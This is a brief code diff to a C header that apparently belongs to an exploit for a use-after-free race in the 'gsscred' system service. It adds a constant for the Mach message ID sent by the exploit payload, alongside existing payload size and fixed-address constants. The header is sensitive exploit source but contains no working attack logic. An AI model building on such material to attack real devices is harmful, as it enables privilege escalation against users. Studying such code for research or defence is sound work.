@@ -14,6 +14,9 @@ static const size_t GSSCRED_RACE_UAF_STRING_SIZE = 0x20;
 static const size_t   GSSCRED_RACE_PAYLOAD_SIZE    = 0x4000;
 static const uint64_t GSSCRED_RACE_PAYLOAD_ADDRESS = 0x0000000120204000;
 
+// The Mach message ID of the Mach message sent by the exploit payload.
+static const uint32_t GSSCRED_RACE_MACH_MESSAGE_ID = 0x414200ab;
+
 // Build the UAF string and payload.
 bool gsscred_race_build_payload(char *uaf_string, uint8_t *payload);
 
